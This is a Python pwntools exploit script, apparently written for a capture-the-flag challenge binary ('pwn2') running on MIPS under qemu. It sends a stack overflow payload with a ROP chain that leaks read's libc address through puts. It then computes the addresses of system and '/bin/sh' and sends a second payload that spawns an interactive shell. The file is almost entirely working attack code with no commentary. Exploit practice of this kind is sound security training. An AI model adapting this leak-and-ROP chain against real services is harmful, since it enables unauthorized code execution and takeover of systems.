from pwn import *
bin_elf = './pwn2'
context.binary = bin_elf
context.log_level = "debug"

if sys.argv[1] == "r":
    p = remote("127.0.0.1",9877)
if sys.argv[1] == "l":
    p = process(["qemu-mipsel", "-L", "/home/v1ct0r/buildroot/output/target", bin_elf])
if sys.argv[1] == "d":
    p = process(["qemu-mipsel", "-g", "1234", "-L", "/home/v1ct0r/buildroot/output/target", bin_elf])

elf = ELF(bin_elf)
libc = ELF("./libc.so.0")

sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))

def malloc(index,size):
    ru("Your choice: ")
    sl('1')
    ru("Give me a block ID: ")
    sl(str(index))
    ru("how big: ")
    sl(str(size))
def free(index):
    ru("Your choice: ")
    sl('3')
    ru("Which one to throw?")
    sl(str(index))
def show(index):
    ru("Your choice: ")
    sl('2')
    ru("Which book do you want to show?")
    sl(str(index))
def edit(index,content):
	ru("Your choice: ")
	sl('4')
	ru("Which book to write?")
	sl(str(index))
	ru("Content: ")
	sl(content)

ru("Warrior,leave your name here:")
sl('king')  
ru("Your choice: ")
sl('7')


j_ras3s2s1s0 = 0x00400798
m_a0_s0_t9_s2 = 0x000401040
read_got = elf.got["read"]
puts_plt = 0x00400FB4
py = ''
py += 'a'*0x38
py += 'bbbb'
py += p32(j_ras3s2s1s0)
py += 'c'*0x1c
py += p32(read_got)#s0
py += p32(0)#s1
py += p32(puts_plt)#s2
py += p32(0)#s3
py += p32(m_a0_s0_t9_s2)#ra
ru("Write down your feeling:")
sl(py)
rc(1)
read_addr = u32(rc(4))
libc_base =read_addr - libc.sym["read"]
print "libc_base--->"+hex(libc_base)
system = libc_base + libc.sym["system"]
binsh = libc_base + libc.search("/bin/sh\x00").next()
py = ''
py += 'a'*0x38
py += 'bbbb'
py += p32(j_ras3s2s1s0)
py += 'c'*0x1c
py += p32(binsh)#s0
py += p32(0)#s1
py += p32(system)#s2
py += p32(0)#s3
py += p32(m_a0_s0_t9_s2)#ra
sl(py)

p.interactive()